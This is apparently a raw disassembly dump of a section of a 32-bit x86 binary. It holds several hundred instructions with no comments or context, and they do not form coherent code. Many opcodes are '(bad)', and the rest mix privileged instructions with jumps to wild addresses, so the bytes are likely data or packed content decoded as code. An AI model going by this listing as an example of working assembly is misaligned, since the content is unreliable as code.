  41b9b6:	xor    dl,BYTE PTR [ecx-0x713aad39]
  41b9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9be:	mov    al,0x3a
  41b9c0:	mov    ebp,0x622685ee
  41b9c5:	loopne 0x41ba0a
  41b9c7:	loope  0x41b9d4
  41b9c9:	mov    eax,gs
  41b9cb:	imul   DWORD PTR [edx+0x747b16b2]
  41b9d1:	mov    WORD PTR [edi-0x6133401],es
  41b9d7:	cld    
  41b9d8:	cwde   
  41b9d9:	dec    esi
  41b9da:	dec    ebp
  41b9db:	xor    edx,DWORD PTR [eax]
  41b9dd:	adc    eax,0xb159a189
  41b9e2:	cmc    
  41b9e3:	stc    
  41b9e4:	push   0xfffffff2
  41b9e6:	mov    edi,0x20ba7c10
  41b9eb:	cmp    BYTE PTR [esi],dl
  41b9ed:	sub    esp,DWORD PTR [ebx+0x370c31ae]
  41b9f3:	adc    BYTE PTR [ebx-0x3d2f1be6],ch
  41b9f9:	(bad)  
  41b9fa:	jmp    DWORD PTR [eax+edx*1+0x4aaa87f7]
  41ba01:	pop    esi
  41ba02:	adc    al,0x55
  41ba04:	cmp    bh,BYTE PTR [eax-0x6d778838]
  41ba0a:	pop    ebp
  41ba0b:	mov    dh,0xef
  41ba0d:	cmp    BYTE PTR [ebx+0x5],al
  41ba10:	xor    al,BYTE PTR [esi+ecx*4+0x13]
  41ba14:	pop    es
  41ba15:	int    0x1a
  41ba17:	and    esi,edx
  41ba19:	mov    WORD PTR [edi],?
  41ba1b:	or     esi,eax
  41ba1d:	loope  0x41ba73
  41ba1f:	out    dx,al
  41ba20:	ja     0x41b9b7
  41ba22:	mov    ecx,0x73b18e50
  41ba27:	xor    ah,BYTE PTR [ebp+eax*4-0x5d]
  41ba2b:	iret   
  41ba2c:	cmp    ebp,DWORD PTR [edi]
  41ba2e:	add    bh,dl
  41ba30:	jecxz  0x41ba71
  41ba32:	retf   0xa4cb
  41ba35:	(bad)  
  41ba36:	iret   
  41ba37:	clc    
  41ba38:	cmp    eax,0xad874b3a
  41ba3d:	icebp  
  41ba3e:	push   edx
  41ba3f:	jge    0x41ba73
  41ba41:	call   0x98ba39aa
  41ba46:	dec    edx
  41ba47:	ja     0x41bab2
  41ba49:	push   0x79
  41ba4b:	out    dx,eax
  41ba4c:	jnp    0x41ba87
  41ba4e:	mov    eax,0x7c6695a7
  41ba53:	cli    
  41ba54:	je     0x41ba7c
  41ba56:	fld    QWORD PTR [eax]
  41ba58:	ret    0xffc1
  41ba5b:	and    BYTE PTR [edi-0x1d],0xde
  41ba5f:	mov    eax,0x25cc53d0
  41ba64:	mov    ch,0xc7
  41ba66:	pop    eax
  41ba67:	enter  0x287b,0x27
  41ba6b:	xor    ecx,edx
  41ba6d:	push   0xb295561e
  41ba72:	mov    cl,cl
  41ba74:	and    al,0x19
  41ba76:	call   0x89853e81
  41ba7b:	cmp    ebp,DWORD PTR [ecx+0x25]
  41ba7e:	(bad)  
  41ba7f:	ror    DWORD PTR [ecx+0x57],1
  41ba82:	stc    
  41ba83:	test   al,0x74
  41ba85:	pushf  
  41ba86:	cmp    cl,BYTE PTR [edx]
  41ba88:	jo     0x41ba20
  41ba8a:	fisubr DWORD PTR [ebp+0x79c51012]
  41ba90:	sbb    al,0xf1
  41ba92:	adc    WORD PTR [eax-0x1b0dbd1c],bx
  41ba99:	add    cl,BYTE PTR [ecx]
  41ba9b:	sub    cl,ch
  41ba9d:	(bad)  
  41ba9e:	cmp    eax,0x35294f51
  41baa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baa4:	jns    0x41baa2
  41baa6:	dec    esp
  41baa7:	jae    0x41ba73
  41baa9:	fstp   QWORD PTR [ecx+0x69923770]
  41baaf:	in     eax,0xc9
  41bab1:	sahf   
  41bab2:	rcl    DWORD PTR [edx],0x42
  41bab5:	aas    
  41bab6:	mov    esp,ds
  41bab8:	dec    edi
  41bab9:	push   ebx
  41baba:	aad    0xa9
  41babc:	add    DWORD PTR [ecx+0x14],ecx
  41babf:	mov    al,0xa9
  41bac1:	inc    edi
  41bac2:	and    al,0xea
  41bac4:	lahf   
  41bac5:	into   
  41bac6:	aaa    
  41bac7:	mov    esi,0xafdc0530
  41bacc:	aas    
  41bacd:	out    0x26,eax
  41bacf:	addr16 cmp al,0xba
  41bad2:	iret   
  41bad3:	xor    esp,edx
  41bad5:	pop    esp
  41bad6:	rcl    DWORD PTR [edi+0x7e],cl
  41bad9:	pusha  
  41bada:	or     al,0x47
  41badc:	sub    al,0xcf
  41bade:	add    ch,BYTE PTR [eax+0x42161590]
  41bae4:	pop    es
  41bae5:	jo     0x41bad6
  41bae7:	inc    ebp
  41bae8:	or     DWORD PTR [edx],ebp
  41baea:	mov    BYTE PTR [edi-0x5dd25aa4],al
  41baf0:	bound  edi,QWORD PTR [eax+0xf274e4]
  41baf6:	dec    edi
  41baf7:	push   ss
  41baf8:	addr16 push esp
  41bafa:	xchg   bh,dh
  41bafc:	das    
  41bafd:	sub    DWORD PTR [edi+0x1297f0e3],edi
  41bb03:	jecxz  0x41bb10
  41bb05:	mov    esi,0x1b87b6ff
  41bb0a:	retf   0x4382
  41bb0d:	cmp    eax,0x10f241ff
  41bb12:	(bad)  
  41bb13:	pop    edx
  41bb14:	mov    ds:0x1ee7dfb7,al
  41bb19:	imul   ebx,DWORD PTR [ebp+0x67],0xc2763595
  41bb20:	sbb    cl,BYTE PTR [ebx+0x5aaf0393]
  41bb26:	fild   QWORD PTR [edi+ecx*4]
  41bb29:	ret    0x87c6
  41bb2c:	jp     0x41baec
  41bb2e:	mov    DWORD PTR [ebx],ebx
  41bb30:	and    DWORD PTR [edi-0x55f4c76e],esp
  41bb36:	dec    ebp
  41bb37:	jp     0x41bb8e
  41bb39:	inc    eax
  41bb3a:	cs xor eax,0x9369a7e5
  41bb40:	jecxz  0x41bb8c
  41bb42:	imul   ecx,DWORD PTR [edx],0xfffffff3
  41bb45:	aaa    
  41bb46:	dec    ebp
  41bb47:	ins    DWORD PTR es:[edi],dx
  41bb48:	outs   dx,DWORD PTR ds:[esi]
  41bb49:	push   ds
  41bb4a:	sar    DWORD PTR [eax],0x94
  41bb4d:	in     eax,dx
  41bb4e:	cmp    edx,DWORD PTR [ebx]
  41bb50:	mov    edx,0x322163b4
  41bb55:	sbb    eax,0x215497d8
  41bb5a:	scas   al,BYTE PTR es:[edi]
  41bb5b:	sbb    DWORD PTR [edx-0x58f83116],edi
  41bb61:	outs   dx,BYTE PTR ds:[esi]
  41bb62:	aam    0xf1
  41bb64:	cmp    eax,0xe424fdee
  41bb69:	lea    ebp,[edx-0x3c]
  41bb6c:	inc    ebp
  41bb6d:	inc    esp
  41bb6e:	cmp    al,0x22
  41bb70:	jmp    0xa2f00fb
  41bb75:	mov    ah,BYTE PTR [esi]
  41bb77:	inc    edx
  41bb78:	fs (bad) 
  41bb7a:	fimul  WORD PTR [ebp-0x46]
  41bb7d:	gs jae 0x41bb2a
  41bb80:	mov    dl,0x55
  41bb82:	push   esp
  41bb83:	fs hlt 
  41bb85:	nop
  41bb86:	sub    BYTE PTR [esi],0x83
  41bb89:	popf   
  41bb8a:	test   eax,0x8d767864
  41bb8f:	test   al,0x44
  41bb91:	mov    gs,ebp
  41bb93:	pop    edi
  41bb94:	jmp    0x79b55d70
  41bb99:	adc    ch,BYTE PTR [edx-0x2c782a42]
  41bb9f:	(bad)  
  41bba0:	jae    0x41bb76
  41bba2:	push   edx
  41bba3:	test   BYTE PTR ds:0xe7f1885c,ah
  41bba9:	push   es
  41bbaa:	lods   al,BYTE PTR ds:[esi]
  41bbab:	js     0x41bb53
  41bbad:	mov    esi,0x15826aa4
  41bbb2:	mov    ebx,0x2bdfc6f7
  41bbb7:	jbe    0x41bbce
  41bbb9:	lods   al,BYTE PTR ds:[esi]
  41bbba:	in     al,0xe5
  41bbbc:	inc    eax
  41bbbd:	lea    ebp,[edi]
  41bbbf:	je     0x41bb8c
  41bbc1:	ror    DWORD PTR [edx-0x33f73f99],1
  41bbc7:	in     eax,dx
  41bbc8:	mov    bl,0x4b
  41bbca:	push   0x37
  41bbcc:	dec    eax
  41bbcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbce:	mov    ah,0x29
  41bbd0:	cmp    bh,BYTE PTR [edx]
  41bbd2:	pushf  
  41bbd3:	or     DWORD PTR ds:0xd257c7d0,esi
  41bbd9:	mov    ch,0x6b
  41bbdb:	aad    0xd6
  41bbdd:	rol    ecx,1
  41bbdf:	test   al,0xff
  41bbe1:	mov    BYTE PTR [edx],ch
  41bbe3:	adc    BYTE PTR [esi+0x1],bl
  41bbe6:	sbb    al,0x61
  41bbe8:	jmp    0xe1a1725f
  41bbed:	pusha  
  41bbee:	mov    eax,ecx
  41bbf0:	xchg   DWORD PTR [ebp-0x4f],esp
  41bbf3:	rcl    BYTE PTR [eax],1
  41bbf5:	loope  0x41bb92
  41bbf7:	pop    edi
  41bbf8:	and    eax,0xd9371443
  41bbfd:	scas   eax,DWORD PTR es:[edi]
  41bbfe:	jl     0x41bc01
  41bc00:	aas    
  41bc01:	mov    ds:0x78645ac2,al
  41bc06:	pop    esi
  41bc07:	loop   0x41bc7f
  41bc09:	pop    ss
  41bc0a:	rcl    DWORD PTR [esi-0x3d5e2a47],cl
  41bc10:	xchg   edi,eax
  41bc11:	add    BYTE PTR [eax],dh
  41bc13:	cmp    cl,ch
  41bc15:	retf   0xeaf0
  41bc18:	ret    0x914
  41bc1b:	or     BYTE PTR [ebx-0x80],ah
  41bc1e:	cmp    BYTE PTR [esi+0x40],0x59
  41bc22:	test   eax,0x4b06aed9
  41bc27:	mov    dh,0x40
  41bc29:	mov    esp,0x202b4e49
  41bc2e:	dec    ebx
  41bc2f:	test   eax,0x5d5c2294
  41bc34:	scas   al,BYTE PTR es:[edi]
  41bc35:	cmp    cl,BYTE PTR [esi-0x7db10680]
  41bc3b:	cdq    
  41bc3c:	ror    BYTE PTR [ebx+0x201891df],cl
  41bc42:	pushf  
  41bc43:	xchg   ebx,eax
  41bc44:	fdivr  QWORD PTR [edx+0x41]
  41bc47:	adc    WORD PTR [edx],sp
  41bc4a:	loope  0x41bc28
  41bc4c:	nop
  41bc4d:	aaa    
  41bc4e:	inc    eax
  41bc4f:	js     0x41bc86
  41bc51:	pop    ebx
  41bc52:	test   DWORD PTR [ebp-0x68f11e92],edi
  41bc58:	dec    ebp
  41bc59:	in     eax,dx
  41bc5a:	jne    0x41bcd6
  41bc5c:	out    0x3a,eax
  41bc5e:	adc    al,0xc1
  41bc60:	or     DWORD PTR [edx],ebp
  41bc62:	(bad)  
  41bc63:	or     eax,0x85d88ff9
  41bc68:	dec    edi
  41bc69:	int    0x87
  41bc6b:	add    ch,BYTE PTR [eax-0x39]
  41bc6e:	loopne 0x41bc77
  41bc70:	pop    ecx
  41bc71:	ss clc 
  41bc73:	or     al,ch
  41bc75:	push   0x287c18e7
  41bc7a:	stos   DWORD PTR es:[edi],eax
  41bc7b:	addr16 jnp 0x41bc47
  41bc7e:	jecxz  0x41bc7e
  41bc80:	push   es
  41bc81:	out    0x95,eax
  41bc83:	push   ecx
  41bc84:	inc    edx
  41bc85:	enter  0x6ea2,0x6
  41bc89:	loopne 0x41bcb6
  41bc8b:	mov    ds:0x9da84c2c,eax
  41bc90:	pop    edi
  41bc91:	or     eax,esp
  41bc93:	jmp    0x41bcf1
  41bc95:	popf   
  41bc96:	ds xchg esp,eax
  41bc98:	and    al,0x82
  41bc9a:	dec    eax
  41bc9b:	aaa    
  41bc9c:	sub    esp,edx
  41bc9e:	fist   WORD PTR ds:0x7bae4bcd
  41bca4:	mov    bl,ch
  41bca6:	pop    esp
  41bca7:	stc    
  41bca8:	das    
  41bca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcaa:	cli    
  41bcab:	not    DWORD PTR ds:0xe94e863d
  41bcb1:	outs   dx,BYTE PTR ds:[esi]
  41bcb2:	or     edx,DWORD PTR [edi]
  41bcb4:	out    0x40,al
  41bcb6:	cmp    esp,DWORD PTR [esi]
  41bcb8:	repnz test ecx,edi
  41bcbb:	hlt    
  41bcbc:	sahf   
  41bcbd:	mov    esi,esi
  41bcbf:	ins    DWORD PTR es:[edi],dx
  41bcc0:	mov    ds:0x49cbfdac,eax
  41bcc5:	je     0x41bcaf
  41bcc7:	cli    
  41bcc8:	jmp    0x4110ab1b
  41bccd:	stos   DWORD PTR es:[edi],eax
  41bcce:	add    ebx,DWORD PTR [edx-0xe]
  41bcd1:	push   ebx
  41bcd2:	pop    ds
  41bcd3:	push   ss
  41bcd4:	mov    eax,edi
  41bcd6:	cmc    
  41bcd7:	cmc    
  41bcd8:	pop    esp
  41bcd9:	or     eax,0xba87123a
  41bcde:	xchg   esp,eax
  41bcdf:	mov    bl,0x96
  41bce1:	mov    bl,0xc
  41bce3:	cmp    dl,ah
  41bce5:	mov    ecx,0xfa9248b0
  41bcea:	xchg   ebx,eax
  41bceb:	dec    ebx
  41bcec:	retf   0x674
  41bcef:	sti    
  41bcf0:	mov    ds:0x8c9480dd,al
  41bcf5:	and    BYTE PTR [ebx+esi*1-0x563a5c50],dh
  41bcfc:	xchg   edx,eax
  41bcfd:	xchg   esp,eax
  41bcfe:	mov    edx,0x2d101994
  41bd03:	pop    ebx
  41bd04:	dec    eax
  41bd05:	(bad)
  41bd0a:	xor    al,0x2f
  41bd0c:	int3   
  41bd0d:	mov    bh,0x4a
  41bd0f:	mov    al,ds:0xaadfd62a
  41bd14:	and    BYTE PTR [ecx+0x7d],0x16
  41bd18:	cld    
  41bd19:	ja     0x41bd50
  41bd1b:	ins    DWORD PTR es:[edi],dx
  41bd1c:	test   DWORD PTR [esi],esp
  41bd1e:	test   eax,0x843f7c8f
  41bd23:	or     DWORD PTR [ebp-0x47],eax
  41bd26:	stos   DWORD PTR es:[edi],eax
  41bd27:	push   0x1d62d7ea
  41bd2c:	mov    edi,0x71b5b928
  41bd31:	sahf   
  41bd32:	rcl    DWORD PTR ds:0x1c74243a,0x66
  41bd39:	pop    esi
  41bd3a:	sub    BYTE PTR [ebx+esi*2+0x6d993b25],cl
  41bd41:	jbe    0x41bd36
  41bd43:	push   esp
  41bd44:	pop    esp
  41bd45:	inc    ebx
  41bd46:	pusha  
  41bd47:	outs   dx,BYTE PTR ds:[esi]
  41bd48:	xchg   edx,eax
  41bd49:	add    eax,0x4691d03
  41bd4e:	inc    edi
  41bd4f:	or     DWORD PTR [ecx],ebx
  41bd51:	icebp  
  41bd52:	(bad)  
  41bd53:	xor    eax,0xdcf5fc70
  41bd58:	pop    ecx
  41bd59:	sub    ebx,DWORD PTR fs:[esi+0x30ec63a0]
  41bd60:	in     eax,dx
  41bd61:	jmp    0xf8b9:0x254f21af
  41bd68:	xchg   esi,eax
  41bd69:	js     0x41bd7c
  41bd6b:	pop    edi
  41bd6c:	mov    ds:0x7b0e9794,al
  41bd71:	pop    ecx
  41bd72:	les    edx,FWORD PTR [edi+0x25]
  41bd75:	or     ebp,esp
  41bd77:	mov    al,ds:0xb7bda1bb
  41bd7c:	gs cld 
  41bd7e:	xchg   edx,eax
  41bd7f:	jo     0x41bd39
  41bd81:	xlat   BYTE PTR ds:[ebx]
  41bd82:	cmp    BYTE PTR [ebp+0x7fcd12e3],al
  41bd88:	adc    edi,DWORD PTR [edi-0x25c77d4a]
  41bd8e:	cmc    
  41bd8f:	mov    dh,0x36
  41bd91:	cmp    BYTE PTR [ecx+0x6c],0x72
  41bd95:	(bad)  
  41bd97:	aad    0xbd
  41bd99:	or     al,0x8
  41bd9b:	xchg   edx,eax
  41bd9c:	icebp  
  41bd9d:	(bad)  
  41bd9f:	daa    
  41bda0:	(bad)  
  41bda1:	sar    DWORD PTR [ebx+0x619b78c0],1
  41bda7:	sbb    DWORD PTR [esp+0x1711638c],ebx
  41bdae:	cli    
  41bdaf:	sbb    ah,BYTE PTR [edi]
  41bdb1:	jge    0x41bd98
  41bdb3:	mov    ebx,0xde25de34
  41bdb8:	jmp    0xe12b:0x127d7f91
  41bdbf:	mov    ecx,0x477ca93c
  41bdc4:	(bad)  
  41bdc5:	xchg   edi,eax
  41bdc6:	fdiv   QWORD PTR [esi]
  41bdc8:	xchg   esi,eax
  41bdc9:	dec    ebp
  41bdca:	mov    esi,0x4ce78d62
  41bdcf:	mov    eax,ds:0xdc0a84ea
  41bdd5:	in     al,dx
  41bdd6:	adc    esp,DWORD PTR [edi]
  41bdd8:	xchg   edi,eax
  41bdd9:	jb     0x41be20
  41bddb:	xor    ch,BYTE PTR [eax-0x28]
  41bdde:	mov    ds:0xf784adfe,eax
  41bde3:	push   edi
  41bde4:	mov    al,ds:0xd9379b7c
  41bde9:	sti    
  41bdea:	dec    ebx
  41bdeb:	mov    esp,0x4e995053
  41bdf0:	daa    
  41bdf1:	push   esp
  41bdf2:	xchg   esi,eax
  41bdf3:	adc    edx,DWORD PTR [ecx]
  41bdf5:	mov    al,0x6e
  41bdf7:	jae    0x41be66
  41bdf9:	pop    esp
  41bdfa:	mov    esi,edi
  41bdfc:	xchg   ecx,eax
  41bdfd:	xor    al,0x7e
  41bdff:	or     BYTE PTR [edx-0x67],dh
  41be02:	in     al,0x23
  41be04:	xor    DWORD PTR [ebx+eiz*1-0x28be577f],0x58
  41be0c:	or     ebp,DWORD PTR [edi]
  41be0e:	mov    edi,cs
  41be10:	sub    edx,DWORD PTR [ebx+0x6d79c9ba]
  41be16:	lods   eax,DWORD PTR ds:[esi]
  41be17:	div    BYTE PTR [edi+0x6d]
  41be1a:	je     0x41be69
  41be1c:	and    ch,BYTE PTR [edi+0x11]
  41be1f:	inc    edi
  41be20:	sub    bh,BYTE PTR [eax+ecx*8]
  41be23:	popf   
  41be24:	and    al,0xb4
  41be26:	or     DWORD PTR [esi],0x2b443d08
  41be2c:	jp     0x41be6d
  41be2e:	retf   
  41be2f:	out    0x12,eax
  41be31:	(bad)  
  41be32:	int    0xb3
  41be34:	or     ecx,DWORD PTR [ecx-0x663114d9]
  41be3a:	and    esi,ebx
  41be3c:	fdiv   QWORD PTR ds:0x4747f853
  41be42:	mov    esp,0x1ff73b48
  41be47:	mov    cl,al
  41be49:	inc    esp
  41be4a:	adc    al,0xbc
  41be4c:	cmp    esp,DWORD PTR [edx+0x2f2e0f9b]
  41be52:	sbb    BYTE PTR [esi],dh
  41be54:	in     eax,0x89
  41be56:	test   DWORD PTR [ebp+0x4f],0x603721d9
  41be5d:	pusha  
  41be5e:	fwait
  41be5f:	inc    ebx
  41be60:	dec    esi
  41be61:	pop    esp
  41be62:	neg    BYTE PTR [eax+0xb]
  41be65:	jp     0x41beba
  41be67:	mov    bl,0xc1
  41be69:	icebp  
  41be6a:	leave  
  41be6b:	push   ecx
  41be6c:	into   
  41be6d:	into   
  41be6e:	(bad)  
  41be6f:	pusha  
  41be70:	sub    edi,DWORD PTR [eax]
  41be72:	sbb    BYTE PTR [eax],0xc1
  41be75:	inc    ebp
  41be76:	icebp  
  41be77:	sub    ebp,DWORD PTR [eax+0x0]
  41be7a:	das    
  41be7b:	scas   al,BYTE PTR es:[edi]
  41be7c:	sub    DWORD PTR [eax-0xa1a05b1],ebx
  41be82:	rol    DWORD PTR [edi],1
  41be84:	sub    eax,0x4ab3424
  41be89:	retf   
  41be8a:	cdq    
  41be8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be8c:	pop    esi
  41be8d:	scas   eax,DWORD PTR es:[edi]
  41be8e:	sbb    DWORD PTR [esi],ebx
  41be90:	ror    eax,0xf4
  41be93:	lock jae 0x41be95
  41be96:	mul    BYTE PTR [eax-0x2a]
  41be99:	mov    bh,0x26
  41be9b:	adc    DWORD PTR [eax+0x62],edi
  41be9e:	xchg   ebx,eax
  41be9f:	sub    bh,bh
  41bea1:	loope  0x41be66
  41bea3:	push   0xf
  41bea5:	dec    edx
  41bea6:	push   ebx
  41bea7:	fild   QWORD PTR [ecx-0x34521eff]
  41bead:	and    BYTE PTR [eax-0x50],ah
  41beb0:	dec    ebx
  41beb1:	adc    DWORD PTR [ecx],0xffc73d4a
  41beb7:	das    
  41beb8:	sti    
  41beb9:	add    DWORD PTR [ecx+0x3b],ebx
  41bebc:	cs int 0x1c
  41bebf:	sahf   
  41bec0:	iret   
  41bec1:	mov    al,ds:0x532190f9
  41bec6:	and    eax,0x43bf6134
  41becb:	bound  ecx,QWORD PTR [esi+edx*1]
  41bece:	in     al,dx
  41becf:	xlat   BYTE PTR ds:[ebx]
  41bed0:	inc    ebx
  41bed1:	sub    BYTE PTR [esi-0x1f],al
  41bed4:	push   edx
  41bed5:	add    edx,ebp
  41bed7:	das    
  41bed8:	xchg   edx,eax
  41bed9:	out    dx,eax
  41beda:	call   0xc66ebc48
  41bedf:	dec    edx
  41bee0:	stos   DWORD PTR es:[edi],eax
  41bee1:	lds    edx,FWORD PTR [edi]
  41bee3:	pushf  
  41bee4:	(bad)  
  41bee5:	adc    eax,0x8b65ea5b
  41beea:	lock xchg ebx,eax
  41beec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beed:	add    al,0x4e
  41beef:	inc    esp
  41bef0:	mov    eax,0x51eb4d39
  41bef5:	mov    bh,0x9b
  41bef7:	pop    ebx
  41bef8:	or     ah,bh
  41befa:	pusha  
  41befb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41befc:	loop   0x41bedc
  41befe:	lea    esp,[edx+esi*2-0xece67c5]
  41bf05:	inc    ebx
  41bf06:	fcomp  DWORD PTR [edx-0x71d56305]
  41bf0c:	and    eax,0x853be5af
  41bf11:	fnsave [ecx]
  41bf13:	pop    ss
  41bf14:	xchg   esp,eax
  41bf15:	add    DWORD PTR [esi+0x583072d6],0x9d4f5ec8
  41bf1f:	bound  esi,QWORD PTR [esi+eiz*1+0x67eb7426]
  41bf26:	fidivr DWORD PTR [edi+0x4b]
  41bf29:	jg     0x41becf
  41bf2b:	inc    ebp
  41bf2c:	ret    
  41bf2d:	add    BYTE PTR [ebp-0x3e],0x12
  41bf31:	jle    0x41bf5c
  41bf33:	xor    eax,0xf950a7c5
  41bf38:	mov    WORD PTR [ecx-0x4dca7831],cs
  41bf3e:	hlt    
  41bf3f:	lock cld 
  41bf41:	mov    esp,0xa0235cd4
  41bf46:	loop   0x41bf15
  41bf48:	loope  0x41bee2
  41bf4a:	retf   
  41bf4b:	test   BYTE PTR [ebx-0x1a9f0d7a],al
  41bf51:	jnp    0x41bf8c
  41bf53:	jl     0x41bf19
  41bf55:	dec    esi
  41bf56:	xor    esp,ecx
  41bf58:	push   ss
  41bf59:	xchg   ebp,eax
  41bf5a:	sbb    al,0x6
  41bf5c:	pop    di
  41bf5e:	and    esi,0xd0059a03
  41bf64:	iret   
  41bf65:	push   esi
  41bf66:	push   ebp
  41bf67:	pop    ecx
  41bf68:	stos   DWORD PTR es:[edi],eax
  41bf69:	sbb    al,0xa7
  41bf6b:	mov    ah,0x58
  41bf6d:	leave  
  41bf6e:	pop    es
  41bf6f:	pop    esi
  41bf70:	int    0xa1
  41bf72:	push   0xd6bd1b2f
  41bf77:	rcr    DWORD PTR [ecx+0x63ade5d4],cl
  41bf7d:	rol    ebx,0xea
  41bf80:	cwde   
  41bf81:	adc    eax,0xa85c30c3
  41bf86:	sub    al,ch
  41bf88:	call   0xa2b8:0xc7ec78ff
  41bf8f:	repnz mul DWORD PTR [edi+0x10]
  41bf93:	xchg   esi,eax
  41bf94:	shl    BYTE PTR [ebx+0x4a788829],0x69
  41bf9b:	mul    BYTE PTR [ebp+ecx*1+0x54a72a89]
  41bfa2:	repnz and eax,0xdacc68f9
  41bfa8:	xchg   BYTE PTR [eax-0x19],bl
  41bfab:	mov    eax,ds:0xb9815748
  41bfb0:	lea    ebp,[edi+0x5e]
  41bfb3:	ja     0x41bf3d
  41bfb5:	push   ecx
  41bfb6:	fdiv   QWORD PTR [ebx]
  41bfb8:	ret    
  41bfb9:	je     0x41bf3d
  41bfbb:	mov    ch,0x17
  41bfbd:	xor    BYTE PTR [edi],0x95
  41bfc0:	jl     0x41bf89
  41bfc2:	lods   eax,DWORD PTR ds:[esi]
  41bfc3:	jns    0x41c016
  41bfc5:	jl     0x41c041
  41bfc7:	and    al,0xb7
  41bfc9:	aaa    
  41bfca:	lahf   
  41bfcb:	and    dh,al
  41bfcd:	jnp    0x41bf5f
  41bfcf:	mov    edx,DWORD PTR [eax-0x8]
  41bfd2:	repnz dec ebp
  41bfd4:	cmp    DWORD PTR [esi+ebx*8+0x11],esi
  41bfd8:	jl     0x41c042
  41bfda:	add    dh,BYTE PTR [ebp+0x7b3c43e6]
  41bfe0:	stos   DWORD PTR es:[edi],eax
  41bfe1:	aad    0x6c
  41bfe3:	mov    ecx,0x17785dcc
  41bfe8:	add    eax,0x21b19046
  41bfed:	lock ja 0x41c051
  41bff0:	cmp    BYTE PTR [ecx+0x44033609],0x91
  41bff7:	xchg   ebp,eax
  41bff8:	cdq    
  41bff9:	fs ret 
  41bffb:	mov    eax,0xe8270066
  41c000:	daa    
  41c001:	(bad)  
  41c002:	(bad)  
  41c003:	ss lock and dl,0xa4
  41c008:	jecxz  0x41c076
  41c00a:	push   ebp
  41c00b:	scas   al,BYTE PTR es:[edi]
  41c00c:	cmp    al,0xa3
  41c00e:	cmp    eax,0x47d6043f
  41c013:	retf   
  41c014:	pop    es
  41c015:	or     edi,DWORD PTR [ecx]
  41c017:	xchg   edi,eax
  41c018:	cdq    
  41c019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c01a:	jmp    0x46948a84
  41c01f:	clc    
  41c020:	jge    0x41bfb4
  41c022:	enter  0xb28,0x60
  41c026:	ins    BYTE PTR es:[edi],dx
  41c027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c028:	mov    al,0x4f
  41c02a:	les    ebp,FWORD PTR [ebp+0x7e]
  41c02d:	sbb    DWORD PTR [eax+edi*8-0x65],esp
  41c031:	das    
  41c032:	arpl   dx,di
  41c034:	jo     0x41bff4
  41c036:	scas   eax,DWORD PTR es:[edi]
  41c037:	dec    ecx
  41c038:	mov    al,BYTE PTR [ebx+0x75c81047]
  41c03e:	inc    eax
  41c03f:	add    DWORD PTR [edi-0x5c],esp
  41c042:	stos   DWORD PTR es:[edi],eax
  41c043:	ja     0x41c06f
  41c045:	cmc    
  41c046:	xchg   ebp,eax
  41c047:	fs mov esp,0x6f0b358f
  41c04d:	cmc    
  41c04e:	jg     0x41c0a7
  41c050:	inc    esp
  41c051:	jno    0x41bfd6
  41c053:	loop   0x41c018
  41c055:	loopne 0x41c06d
  41c057:	mov    BYTE PTR [ecx-0x26],bh
  41c05a:	out    0xe,eax
  41c05c:	test   DWORD PTR [esi-0x2c9d5816],0xdbbe558a
  41c066:	mov    ds:0xea64685f,eax
  41c06b:	adc    bl,BYTE PTR [ebx+0x3d]
  41c06e:	repnz or ch,0x25
  41c072:	(bad)  
  41c073:	cmp    DWORD PTR [ebx-0x4ce4fbee],ecx
  41c079:	loopne 0x41c0ab
  41c07b:	sahf   
  41c07c:	int    0xe1
  41c07e:	ror    eax,1
  41c080:	scas   eax,DWORD PTR es:[edi]
  41c081:	iret   
  41c082:	mov    ah,0x80
  41c084:	inc    edi
  41c085:	ret    
  41c086:	mov    ebp,0x888075c1
  41c08b:	outs   dx,DWORD PTR ds:[esi]
  41c08c:	xor    esi,DWORD PTR gs:0x1f57248e
  41c093:	mov    bl,0xa4
  41c095:	pop    ss
  41c096:	and    al,0x5
  41c098:	fxtract 
  41c09a:	pop    esi
  41c09b:	cmp    al,0x6d
  41c09d:	push   es
  41c09e:	xor    bl,BYTE PTR [bx+si+0x7f]
  41c0a2:	mov    eax,0x51c9c5a4
  41c0a7:	inc    esi
  41c0a8:	push   ebx
  41c0a9:	inc    esi
  41c0aa:	push   ebx
  41c0ab:	popa   
  41c0ac:	das    
  41c0ad:	xchg   edx,eax
  41c0ae:	shl    bl,1
  41c0b0:	cwde   
  41c0b1:	popa   
  41c0b2:	adc    BYTE PTR [ebx-0x722206b7],bh
  41c0b8:	add    bl,BYTE PTR [edi+esi*4+0x38cf6d6b]
  41c0bf:	xor    edi,ecx
  41c0c1:	sub    BYTE PTR ds:0x5a4c0142,ch
  41c0c7:	es inc eax
  41c0c9:	lahf   
  41c0ca:	or     DWORD PTR [eax+eiz*4+0x26],esp
  41c0ce:	or     edi,DWORD PTR [esi]
  41c0d0:	mov    ecx,0x35d32175
  41c0d5:	mov    esi,0x4cb0b687
  41c0da:	mov    dh,0xfa
  41c0dc:	mov    eax,esp
  41c0de:	sar    BYTE PTR [edx+eiz*8+0x6e1f96a4],0xde
  41c0e6:	add    DWORD PTR [ecx+0x1bfd9906],esp
  41c0ec:	retf   
  41c0ed:	cmp    BYTE PTR [esp+edx*4-0x7bc6fb44],0x99
  41c0f5:	push   ds
  41c0f6:	mov    bh,0xdf
  41c0f8:	out    0x72,al
  41c0fa:	(bad)  [esi+0x35]
  41c0fd:	and    bh,bh
  41c0ff:	das    
  41c100:	fcomp  QWORD PTR [eax+0x1266af46]
  41c106:	out    0x9a,al
  41c108:	stos   BYTE PTR es:[edi],al
  41c109:	pushf  
  41c10a:	push   cs
  41c10b:	and    dh,BYTE PTR [edx]
  41c10d:	sahf   
  41c10e:	add    edx,DWORD PTR [esi-0x441efd6]
  41c114:	adc    al,BYTE PTR [eax+0x41]
  41c117:	ds test eax,0x7d3e2f85
  41c11d:	xchg   edx,eax
  41c11e:	and    edx,DWORD PTR [ebx]
  41c120:	call   0xfce2c0b0
  41c125:	jo     0x41c156
